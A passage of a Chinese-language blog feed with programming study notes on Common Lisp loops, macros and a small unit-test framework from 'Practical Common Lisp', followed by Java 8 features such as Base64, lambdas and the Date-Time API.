<h2 id="do"><a href="#do" class="headerlink" title="do"></a>do</h2><pre><code>(do (variable-defination*)
    (end-test-form result-form*)
    statment*)
</code></pre>
<p>每个variable-defination的格式：</p>
<p>(var init-form step-form)</p>
<p>init-form:在循环开始时求值并赋给var，如果没有给出，则赋值为nil。</p>
<p>step-form:在后续迭代开始前求值并赋给var,可选，如果没有变量值不变，<br>可在循环体中做修改。</p>
<p>end-test-form:在每次迭代开始时以及所有所有循环变量指定新值后会被求值，只要值为nil，迭代继续。</p>
<p>result-form: 当end-test-form值为真时会被求值，最后一个结果形式的值被当作DO表达式的值返回。<br>在迭代的每一步里step-form将在分配任何值给变量之前被求值。这意味着可以在步长形式里引用其它循环变量。如在下列循环中：</p>
<pre><code>CL-USER&gt; (do ((n 0 (+ 1 n))
          (cur 0 next)
          (next 1 (+ cur next)))
         ((= 10 n) cur))
55
</code></pre>
<p>定义了三个variable-defination，n、cur、next，三个的步长(+ 1 n)、next、(+ cur next)都用旧值来求值。当所有步长被求值后变量才会赋新值。</p>
<p>由于可以同时推进多个循环变量，往往不需要循环体。</p>
<pre><code>CL-USER&gt; (do ((i 0 (+ 1 i)))
         ((&gt;= i 4))
       (print i))

0 
1 
2 
3 
NIL
</code></pre>
<h2 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h2>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第8章如何自定义宏-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter8/</url>
    <content><![CDATA[<h2 id="DEFMACRO"><a href="#DEFMACRO" class="headerlink" title="DEFMACRO"></a>DEFMACRO</h2><p>格式：</p>
<pre><code>(defmacro name (parameter*)
       body-form*)
   
</code></pre>
<h2 id="do-primes"><a href="#do-primes" class="headerlink" title="do-primes"></a>do-primes</h2><p>素数迭代宏的实现</p>
<p>两个工具函数</p>
<p>一个数是否是素数</p>
<pre><code>(defun primep (number)
       (when (&gt; number 1)
         (loop for fac from 2 to (isqrt number) never (zerop (mod number fac)))))

CL-USER&gt; (primep 17)
T
CL-USER&gt; (primep 10)
NIL
CL-USER&gt; 
</code></pre>
<p>找一下数的下一个素数</p>
<pre><code> (defun next-primep (number)
       (loop for n from number when (primep n) return n))
       
CL-USER&gt; (next-primep 10)
11
CL-USER&gt; (next-primep 20)
23
CL-USER&gt; 
</code></pre>
<p>do-primes定义</p>
<pre><code>(defmacro do-primes (var-and-range &amp;rest body)
       (let ((var (first var-and-range))
         (start (second var-and-range))
         (end (third var-and-range)))
         `(do ((,var (next-primep ,start) (next-primep (+ 1 ,var))))
          ((&gt; ,var ,end))
        ,@body)))
        
</code></pre>
<p>测试</p>
<pre><code>CL-USER&gt; (do-primes (p 0 19) (format t &quot;~d &quot; p))
2 3 5 7 11 13 17 19 
NIL
</code></pre>
<p>宏展开式</p>
<pre><code>CL-USER&gt; (macroexpand-1 `(do-primes (p 0 19) (format t &quot;~d &quot; p)))
(DO ((P (NEXT-PRIMEP 0) (NEXT-PRIMEP (+ 1 P)))) ((&gt; P 19)) (FORMAT T &quot;~d &quot; P))
T
</code></pre>
<p>slime宏展开快捷键</p>
<p>光标移动到源码的开括号上，C-c RET，调用slime的slime-macroexpand-1，后者调用macroexpand-1，结果输出到一缓冲区</p>
<h2 id="堵住漏洞"><a href="#堵住漏洞" class="headerlink" title="堵住漏洞"></a>堵住漏洞</h2><pre><code>(defmacro do-primes ((var start end) &amp;rest body)
             `(do ((,var (next-primep ,start) (next-primep (+ 1 ,var))))
              ((&gt; ,var ,end))
            ,@body))

CL-USER&gt; (do-primes (p 0 19) (format t &quot;~d &quot; p))
2 3 5 7 11 13 17 19 
NIL
</code></pre>
<p>多次求值漏洞</p>
<pre><code>(do-primes (p 0 (random 100))
       (format t &quot;~d &quot; p))
       
(DO ((P (NEXT-PRIMEP 0) (NEXT-PRIMEP (+ 1 P))))
    ((&gt; P (RANDOM 100)))
  (FORMAT T &quot;~d &quot; P))
</code></pre>
<p>循环结束条件每次迭代会随机一次，需求应该是在第一次进入迭代时产生一次做结束值。</p>
<pre><code>(defmacro do-primes ((var start end) &amp;rest body)
             `(do ((,var (next-primep ,start) (next-primep (+ 1 ,var)))
                (ending-value ,end))
                ((&gt; ,var ending-value))
            ,@body))
</code></pre>
<p>新定义变量代替入参解决多次求值问题。</p>
<p>参数漏洞</p>
<p>新定义变量引入新问题，宏参会宏体同名变量互相影响。</p>
<pre><code>(do-primes (ending-value 0 10)
       (print ending-value))
       
(DO ((ENDING-VALUE (NEXT-PRIMEP 0) (NEXT-PRIMEP (+ 1 ENDING-VALUE)))
     (ENDING-VALUE 10))
    ((&gt; ENDING-VALUE ENDING-VALUE))
  (PRINT ENDING-VALUE))
</code></pre>
<p>gensym解决变量名冲突问题</p>
<pre><code>(defmacro do-primes ((var start end) &amp;rest body)
       (let ((ending-value-name (gensym)))
         `(do ((,var (next-primep ,start) (next-primep (+ 1 ,var)))
                    (,ending-value-name ,end))
                    ((&gt; ,var ,ending-value-name))
                ,@body)))
</code></pre>
<p>宏展开</p>
<pre><code>(DO ((P (NEXT-PRIMEP 0) (NEXT-PRIMEP (+ 1 P)))
     (#:G780 19))
    ((&gt; P #:G780))
  (FORMAT T &quot;~d &quot; P))
</code></pre>
<p>漏洞处理总结：</p>
<p>除非有特殊理由，否则需要将展开式中的任何子形式放在一个位置上，使其求值顺序与宏调用的子形式相同。</p>
<p>除非有特殊理由，否则需要确保子形式仅被求值一次，方法是在展开式中创建变量来持有求值参数形式所得到的值，然后在展开式中所有需要用到该值的地方使用这个变量。</p>
<p>在宏展开期使用GENSYM来创建展开式中用到的变量名。</p>
<h2 id="用于编写宏的宏"><a href="#用于编写宏的宏" class="headerlink" title="用于编写宏的宏"></a>用于编写宏的宏</h2><p>简化GENSYM的宏</p>
<pre><code>(defmacro with-gensyms ((&amp;rest names) &amp;body body)
       `(let ,(loop for n in names collect `(,n (gensym)))
          ,@body))
      
</code></pre>
<p>应用</p>
<pre><code>(defmacro do-primes ((var start end) &amp;rest body)
           (with-gensyms (ending-value-name)
             `(do ((,var (next-primep ,start) (next-primep (+ 1 ,var)))
                        (,ending-value-name ,end))
                        ((&gt; ,var ,ending-value-name))
                    ,@body)))
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第9章建立单元测试框架-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter9/</url>
    <content><![CDATA[<p>测试框架设计目地是尽可能简单的增加新测试、运行多个测试套件、跟踪测试的失败。</p>
<pre><code>CL-USER&gt; (defun test-+()
       (and
        (= (+ 1 2) 3)
        (= (+ 1 2 3) 6)
        (= (+ -1 -3) -4)))
TEST-+
CL-USER&gt; (test-+)
T
CL-USER&gt; 
</code></pre>
<p>不知道每个用例的运行情况。</p>
<h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><pre><code>CL-USER&gt; (defun test-+()
        (format t &quot;~:[fail~;pass~] ... ~a~%&quot; (= (+ 1 2) 3) &#39;(= (+ 1 2) 3))
        (format t &quot;~:[fail~;pass~] ... ~a~%&quot;  (= (+ 1 2 3) 6) &#39;(= (+ 1 2 3) 6))
        (format t &quot;~:[fail~;pass~] ... ~a~%&quot;  (= (+ -1 -3) -4) &#39;(= (+ -1 -3) -4)))
TEST-+
CL-USER&gt; (test-+)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
pass ... (= (+ -1 -3) -4)
NIL
CL-USER&gt; 
</code></pre>
<h2 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h2><p>重构去除重复</p>
<pre><code>CL-USER&gt; (defun report-result (result form)
        (format t &quot;~:[fail~;pass~] ... ~a~%&quot; result form))
REPORT-RESULT
CL-USER&gt; (defun test-+()
        (report-result (= (+ 1 2) 3) &#39;(= (+ 1 2) 3))
        (report-result  (= (+ 1 2 3) 6) &#39;(= (+ 1 2 3) 6))
        (report-result  (= (+ -1 -3) -4) &#39;(= (+ -1 -3) -4)))
TEST-+
CL-USER&gt; (test-+)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
pass ... (= (+ -1 -3) -4)
NIL
CL-USER&gt; 
</code></pre>
<p>用宏再次去重</p>
<pre><code>CL-USER&gt; (defmacro check (form)
       `(report-result ,form &#39;,form))
CHECK
CL-USER&gt; (defun test-+()
        (check (= (+ 1 2) 3))
        (check  (= (+ 1 2 3) 6))
        (check  (= (+ -1 -3) -4)))
TEST-+
CL-USER&gt; (test-+)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
pass ... (= (+ -1 -3) -4)
NIL
CL-USER&gt; 
</code></pre>
<p>check去重</p>
<pre><code>CL-USER&gt; (defmacro check (&amp;body forms)
       `(progn
          ,@(loop for f in forms collect `(report-result ,f &#39;,f))))
CHECK
CL-USER&gt; (defun test-+()
           (check 
             (= (+ 1 2) 3)
             (= (+ 1 2 3) 6)
             (= (+ -1 -3) -4)))
TEST-+
CL-USER&gt; (test-+)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
pass ... (= (+ -1 -3) -4)
NIL
CL-USER&gt;
</code></pre>
<h2 id="修复返回值"><a href="#修复返回值" class="headerlink" title="修复返回值"></a>修复返回值</h2><p>默认返回值为nil，修改为全通过为t，只要有一个不通过为nil的返回形式。</p>
<p>第一步：每个单元测试返回测试结果</p>
<pre><code>(defun report-result (result form)
        (format t &quot;~:[fail~;pass~] ... ~a~%&quot; result form) result)
</code></pre>
<p>第二步：创建没有拦截的AND宏</p>
<pre><code>(defmacro combine-results (&amp;body forms)
       (with-gensyms (result)
         `(let ((,result t))
        ,@(loop for f in forms collect `(unless ,f (setf ,result nil)))
        ,result)))
</code></pre>
<p>第三步：替换progn</p>
<pre><code>(defmacro check (&amp;body forms)
       `(combine-results
          ,@(loop for f in forms collect `(report-result ,f &#39;,f))))
</code></pre>
<p>测试</p>
<pre><code>CL-USER&gt; (test-+)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
pass ... (= (+ -1 -3) -4)
T
CL-USER&gt; (defun test-+()
        (check (= (+ 1 2) 3)
        (= (+ 1 2 3) 6)
         (= (+ -1 -3) -5)))
TEST-+
CL-USER&gt; (test-+)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
fail ... (= (+ -1 -3) -5)
NIL
CL-USER&gt; 
</code></pre>
<h2 id="更好的结果输出"><a href="#更好的结果输出" class="headerlink" title="更好的结果输出"></a>更好的结果输出</h2><pre><code>CL-USER&gt; (defun test-* ()
       (check
         (= (* 2 2) 4)
         (= (* 3 5) 15)))
TEST-*
CL-USER&gt; (defun test-arithmetic ()
       (combine-results
         (test-+)
         (test-*)))
TEST-ARITHMETIC
CL-USER&gt; (test-arithmetic)
pass ... (= (+ 1 2) 3)
pass ... (= (+ 1 2 3) 6)
pass ... (= (+ -1 -3) -4)
pass ... (= (* 2 2) 4)
pass ... (= (* 3 5) 15)
T
CL-USER&gt; 
</code></pre>
<p>输出测试方法名</p>
<pre><code>(defvar *test-name* nil)

(defun report-result (result form)
        (format t &quot;~:[fail~;pass~] ...~a: ~a~%&quot; result *test-name* form))
        
(defun test-* ()
       (let ((*test-name* &#39;test-*))
         (check
         (= (* 2 2) 4)
         (= (* 3 5) 15))))
         
(defun test-+()
        (let ((*test-name* &#39;test-+))
          (check 
                 (= (+ 1 2) 3)
                 (= (+ 1 2 3) 6)
                 (= (+ -1 -3) -4))))
</code></pre>
<p>测试</p>
<pre><code>CL-USER&gt; (test-arithmetic)
pass ...TEST-+: (= (+ 1 2) 3)
pass ...TEST-+: (= (+ 1 2 3) 6)
pass ...TEST-+: (= (+ -1 -3) -4)
pass ...TEST-*: (= (* 2 2) 4)
pass ...TEST-*: (= (* 3 5) 15)
NIL
</code></pre>
<h2 id="抽象诞生"><a href="#抽象诞生" class="headerlink" title="抽象诞生"></a>抽象诞生</h2><p>抽象函数定义</p>
<pre><code>(defmacro deftest (name parameters &amp;body body)
       `(defun ,name ,parameters
          (let ((*test-name* &#39;,name))
        ,@body)))
</code></pre>
<p>新测试方法</p>
<pre><code>(deftest test-* ()
       (check
         (= (* 2 2) 4)
         (= (* 3 5) 15)))
</code></pre>
<h2 id="测试层次体系"><a href="#测试层次体系" class="headerlink" title="测试层次体系"></a>测试层次体系</h2><pre><code>(defmacro deftest (name parameters &amp;body body)
       `(defun ,name ,parameters
          (let ((*test-name* (append *test-name* (list &#39;,name))))
        ,@body)))
        
(deftest test-* ()
   (check
     (= (* 2 2) 4)
     (= (* 3 5) 15)))
             
(deftest test-+()
    (check (= (+ 1 2) 3)
        (= (+ 1 2 3) 6)
        (= (+ -1 -3) -5)))
             
(deftest test-arithmetic ()
   (combine-results
     (test-+)
     (test-*)))
</code></pre>
<p>所有用deftest定义的测试用例都会输出方法名</p>
<p>测试</p>
<pre><code>CL-USER&gt; (test-arithmetic)
pass ...(TEST-ARITHMETIC TEST-+): (= (+ 1 2) 3)
pass ...(TEST-ARITHMETIC TEST-+): (= (+ 1 2 3) 6)
fail ...(TEST-ARITHMETIC TEST-+): (= (+ -1 -3) -5)
pass ...(TEST-ARITHMETIC TEST-*): (= (* 2 2) 4)
pass ...(TEST-ARITHMETIC TEST-*): (= (* 3 5) 15)
NIL
CL-USER&gt; 
</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre><code>(defvar *test-name* nil)

(defun report-result (result form)
            (format t &quot;~:[fail~;pass~] ...~a: ~a~%&quot; result *test-name* form))
            
(defmacro deftest (name parameters &amp;body body)
   `(defun ,name ,parameters
      (let ((*test-name* (append *test-name* (list &#39;,name))))
    ,@body)))
        
(defmacro with-gensyms ((&amp;rest names) &amp;body body)
   `(let ,(loop for n in names collect `(,n (gensym)))
      ,@body))
          
(defmacro combine-results (&amp;body forms)
   (with-gensyms (result)
         `(let ((,result t))
        ,@(loop for f in forms collect `(unless ,f (setf ,result nil)))
        ,result)))
            
 (defmacro check (&amp;body forms)
       `(combine-results
              ,@(loop for f in forms collect `(report-result ,f &#39;,f))))
</code></pre>
<p>测试</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">(<span class="name">deftest</span> test-* ()</span><br><span class="line">	   (<span class="name">check</span></span><br><span class="line">	     (<span class="name">=</span> (<span class="name">*</span> <span class="number">2</span> <span class="number">2</span>) <span class="number">4</span>)</span><br><span class="line">	     (<span class="name">=</span> (<span class="name">*</span> <span class="number">3</span> <span class="number">5</span>) <span class="number">15</span>)))</span><br><span class="line">    	     </span><br><span class="line">(<span class="name">deftest</span> test-+()</span><br><span class="line">    (<span class="name">check</span> (<span class="name">=</span> (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span>) <span class="number">3</span>)</span><br><span class="line">	    (<span class="name">=</span> (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>) <span class="number">6</span>)</span><br><span class="line">	     (<span class="name">=</span> (<span class="name">+</span> <span class="number">-1</span> <span class="number">-3</span>) <span class="number">-5</span>)))</span><br><span class="line">    	     </span><br><span class="line">(<span class="name">deftest</span> test-arithmetic ()</span><br><span class="line">       (<span class="name">combine-results</span></span><br><span class="line">         (<span class="name">test-+</span>)</span><br><span class="line">         (<span class="name">test-*</span>)))</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">CL-USER&gt; (<span class="name">test-arithmetic</span>)</span><br><span class="line">pass ...(<span class="name">TEST-ARITHMETIC</span> TEST-+): (<span class="name">=</span> (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span>) <span class="number">3</span>)</span><br><span class="line">pass ...(<span class="name">TEST-ARITHMETIC</span> TEST-+): (<span class="name">=</span> (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>) <span class="number">6</span>)</span><br><span class="line">fail ...(<span class="name">TEST-ARITHMETIC</span> TEST-+): (<span class="name">=</span> (<span class="name">+</span> <span class="number">-1</span> <span class="number">-3</span>) <span class="number">-5</span>)</span><br><span class="line">pass ...(<span class="name">TEST-ARITHMETIC</span> TEST-*): (<span class="name">=</span> (<span class="name">*</span> <span class="number">2</span> <span class="number">2</span>) <span class="number">4</span>)</span><br><span class="line">pass ...(<span class="name">TEST-ARITHMETIC</span> TEST-*): (<span class="name">=</span> (<span class="name">*</span> <span class="number">3</span> <span class="number">5</span>) <span class="number">15</span>)</span><br><span class="line">NIL</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA8之Base64</title>
    <url>/blog/plang/java/features/java8/base64/</url>
    <content><![CDATA[<p>对Base64编码的支持已经被加入到Java 8官方库中，这样不需要使用第三方库就可以进行Base64编码，例子代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.javacodegeeks.java8.base64;</span><br><span class="line"></span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Base64s &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        final String text = &quot;Base64 finally in Java 8!&quot;;</span><br><span class="line"></span><br><span class="line">        final String encoded = Base64</span><br><span class="line">            .getEncoder()</span><br><span class="line">            .encodeToString( text.getBytes( StandardCharsets.UTF_8 ) );</span><br><span class="line">        System.out.println( encoded );</span><br><span class="line"></span><br><span class="line">        final String decoded = new String( </span><br><span class="line">            Base64.getDecoder().decode( encoded ),</span><br><span class="line">            StandardCharsets.UTF_8 );</span><br><span class="line">        System.out.println( decoded );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个例子的输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QmFzZTY0IGZpbmFsbHkgaW4gSmF2YSA4IQ==</span><br><span class="line">Base64 finally in Java 8!</span><br></pre></td></tr></table></figure>
<p>新的Base64API也支持URL和MINE的编码解码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Base64.getUrlEncoder()</span><br><span class="line">Base64.getUrlDecoder()</span><br><span class="line">Base64.getMimeEncoder()</span><br><span class="line">Base64.getMimeDecoder()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA8之Lambda表达式</title>
    <url>/blog/plang/java/features/java8/lambda/</url>
    <content><![CDATA[<p>Lambda表达式（也称为闭包）是Java 8中最大和最令人期待的语言改变。它允许我们将函数当成参数传递给某个方法，或者把代码本身当作数据处理：函数式开发者非常熟悉这些概念。</p>
<p>很多JVM平台上的语言（Groovy、Scala等）从诞生之日就支持Lambda表达式，但是Java开发者没有选择，只能使用匿名内部类代替Lambda表达式。</p>
<p>Lambda的设计耗费了很多时间和很大的社区力量，最终找到一种折中的实现方案，可以实现简洁而紧凑的语言结构。最简单的Lambda表达式可由逗号分隔的参数列表、-&gt;符号和语句块组成，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach( e -&gt; System.out.println( e ) );</span><br></pre></td></tr></table></figure>
<p>在上面这个代码中的参数e的类型是由编译器推理得出的，你也可以显式指定该参数的类型，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach( ( String e ) -&gt; System.out.println( e ) );</span><br></pre></td></tr></table></figure>
<p>如果Lambda表达式需要更复杂的语句块，则可以使用花括号将该语句块括起来，类似于Java中的函数体，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach( e -&gt; &#123;</span><br><span class="line">    System.out.print( e );</span><br><span class="line">    System.out.print( e );</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>
<p>Lambda表达式可以引用类成员和局部变量（会将这些变量隐式得转换成final的），例如下列两个代码块的效果完全相同：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String separator = &quot;,&quot;;</span><br><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach(</span><br><span class="line">    ( String e ) -&gt; System.out.print( e + separator ) );</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">final String separator = &quot;,&quot;;</span><br><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).forEach(</span><br><span class="line">    ( String e ) -&gt; System.out.print( e + separator ) );</span><br></pre></td></tr></table></figure>
<p>Lambda表达式有返回值，返回值的类型也由编译器推理得出。如果Lambda表达式中的语句块只有一行，则可以不用使用return语句，下列两个代码片段效果相同：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).sort( ( e1, e2 ) -&gt; e1.compareTo( e2 ) );</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.asList( &quot;a&quot;, &quot;b&quot;, &quot;d&quot; ).sort( ( e1, e2 ) -&gt; &#123;</span><br><span class="line">    int result = e1.compareTo( e2 );</span><br><span class="line">    return result;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Lambda的设计者们为了让现有的功能与Lambda表达式良好兼容，考虑了很多方法，于是产生了函数接口这个概念。函数接口指的是只有一个函数的接口，这样的接口可以隐式转换为Lambda表达式。<code>java.lang.Runnable</code>和<code>java.util.concurrent.Callable</code>是函数式接口的最佳例子。</p>
<p>在实践中，函数式接口非常脆弱：只要某个开发者在该接口中添加一个函数，则该接口就不再是函数式接口进而导致编译失败。为了克服这种代码层面的脆弱性，并显式说明某个接口是函数式接口，Java 8 提供了一个特殊的注解<code>@FunctionalInterface</code>（Java 库中的所有相关接口都已经带有这个注解了），举个简单的函数式接口的定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@FunctionalInterface</span><br><span class="line">public interface Functional &#123;</span><br><span class="line">    void method();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过有一点需要注意，默认方法和静态方法不会破坏函数式接口的定义，因此如下的代码是合法的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@FunctionalInterface</span><br><span class="line">public interface FunctionalDefaultMethods &#123;</span><br><span class="line">    void method();</span><br><span class="line"></span><br><span class="line">    default void defaultMethod() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Lambda表达式作为Java 8的最大卖点，它有潜力吸引更多的开发者加入到JVM平台，并在纯Java编程中使用函数式编程的概念。如果你需要了解更多Lambda表达式的细节，可以参考官方文档。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA8之Date Time API</title>
    <url>/blog/plang/java/features/java8/datetimeapi/</url>
    <content><![CDATA[<p>Java 8引入了新的Date-Time API(JSR 310)来改进时间、日期的处理。时间和日期的管理一直是最令Java开发者痛苦的问题。java.util.Date和后来的java.util.Calendar一直没有解决这个问题（甚至令开发者更加迷茫）。</p>
<p>因为上面这些原因，诞生了第三方库Joda-Time，可以替代Java的时间管理API。Java 8中新的时间和日期管理API深受Joda-Time影响，并吸收了很多Joda-Time的精华。新的java.time包包含了所有关于日期、时间、时区、Instant（跟日期类似但是精确到纳秒）、duration（持续时间）和时钟操作的类。新设计的API认真考虑了这些类的不变性（从java.util.Calendar吸取的教训），如果某个实例需要修改，则返回一个新的对象。</p>
<p>我们接下来看看java.time包中的关键类和各自的使用例子。首先，Clock类使用时区来返回当前的纳秒时间和日期。Clock可以替代System.currentTimeMillis()和TimeZone.getDefault()。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Get the system clock as UTC offset </span><br><span class="line">final Clock clock = Clock.systemUTC();</span><br><span class="line">System.out.println( clock.instant() );</span><br><span class="line">System.out.println( clock.millis() );</span><br></pre></td></tr></table></figure>
<p>这个例子的输出结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014-04-12T15:19:29.282Z</span><br><span class="line">1397315969360</span><br></pre></td></tr></table></figure>
<p>第二，关注下LocalDate和LocalTime类。LocalDate仅仅包含ISO-8601日历系统中的日期部分；LocalTime则仅仅包含该日历系统中的时间部分。这两个类的对象都可以使用Clock对象构建得到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Get the local date and local time</span><br><span class="line">final LocalDate date = LocalDate.now();</span><br><span class="line">final LocalDate dateFromClock = LocalDate.now( clock );</span><br><span class="line"></span><br><span class="line">System.out.println( date );</span><br><span class="line">System.out.println( dateFromClock );</span><br><span class="line"></span><br><span class="line">// Get the local date and local time</span><br><span class="line">final LocalTime time = LocalTime.now();</span><br><span class="line">final LocalTime timeFromClock = LocalTime.now( clock );</span><br><span class="line"></span><br><span class="line">System.out.println( time );</span><br><span class="line">System.out.println( timeFromClock );</span><br></pre></td></tr></table></figure>
<p>上述例子的输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014-04-12</span><br><span class="line">2014-04-12</span><br><span class="line">11:25:54.568</span><br><span class="line">15:25:54.568</span><br></pre></td></tr></table></figure>
<p>LocalDateTime类包含了LocalDate和LocalTime的信息，但是不包含ISO-8601日历系统中的时区信息。这里有一些关于LocalDate和LocalTime的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Get the local date/time</span><br><span class="line">final LocalDateTime datetime = LocalDateTime.now();</span><br><span class="line">final LocalDateTime datetimeFromClock = LocalDateTime.now( clock );</span><br><span class="line"></span><br><span class="line">System.out.println( datetime );</span><br><span class="line">System.out.println( datetimeFromClock );</span><br></pre></td></tr></table></figure>
<p>上述这个例子的输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014-04-12T11:37:52.309</span><br><span class="line">2014-04-12T15:37:52.309</span><br></pre></td></tr></table></figure>
<p>如果你需要特定时区的data&#x2F;time信息，则可以使用ZoneDateTime，它保存有ISO-8601日期系统的日期和时间，而且有时区信息。下面是一些使用不同时区的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Get the zoned date/time</span><br><span class="line">final ZonedDateTime zonedDatetime = ZonedDateTime.now();</span><br><span class="line">final ZonedDateTime zonedDatetimeFromClock = ZonedDateTime.now( clock );</span><br><span class="line">final ZonedDateTime zonedDatetimeFromZone = ZonedDateTime.now( ZoneId.of( &quot;America/Los_Angeles&quot; ) );</span><br><span class="line"></span><br><span class="line">System.out.println( zonedDatetime );</span><br><span class="line">System.out.println( zonedDatetimeFromClock );</span><br><span class="line">System.out.println( zonedDatetimeFromZone );</span><br></pre></td></tr></table></figure>
<p>这个例子的输出结果是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014-04-12T11:47:01.017-04:00[America/New_York]</span><br><span class="line">2014-04-12T15:47:01.017Z</span><br><span class="line">2014-04-12T08:47:01.017-07:00[America/Los_Angeles]</span><br></pre></td></tr></table></figure>
<p>最后看下Duration类，它持有的时间精确到秒和纳秒。这使得我们可以很容易得计算两个日期之间的不同，例子代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Get duration between two dates</span><br><span class="line">final LocalDateTime from = LocalDateTime.of( 2014, Month.APRIL, 16, 0, 0, 0 );</span><br><span class="line">final LocalDateTime to = LocalDateTime.of( 2015, Month.APRIL, 16, 23, 59, 59 );</span><br><span class="line"></span><br><span class="line">final Duration duration = Duration.between( from, to );</span><br><span class="line">System.out.println( &quot;Duration in days: &quot; + duration.toDays() );</span><br><span class="line">System.out.println( &quot;Duration in hours: &quot; + duration.toHours() );</span><br></pre></td></tr></table></figure>
<p>这个例子用于计算2014年4月16日和2015年4月16日之间的天数和小时数，输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Duration in days: 365</span><br><span class="line">Duration in hours: 8783</span><br></pre></td></tr></table></figure>
<p>对于Java 8的新日期时间的总体印象还是比较积极的，一部分是因为Joda-Time的积极影响，另一部分是因为官方终于听取了开发人员的需求。如果希望了解更多细节，可以参考官方文档。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA8之接口默认方法和静态方法</title>
    <url>/blog/plang/java/features/java8/defintf/</url>
    <content><![CDATA[<p>Java 8使用两个新概念扩展了接口的含义：默认方法和静态方法。默认方法使得接口有点类似traits，不过要实现的目标不一样。默认方法使得开发者可以在 不破坏二进制兼容性的前提下，往现存接口中添加新的方法，即不强制那些实现了该接口的类也同时实现这个新加的方法。</p>
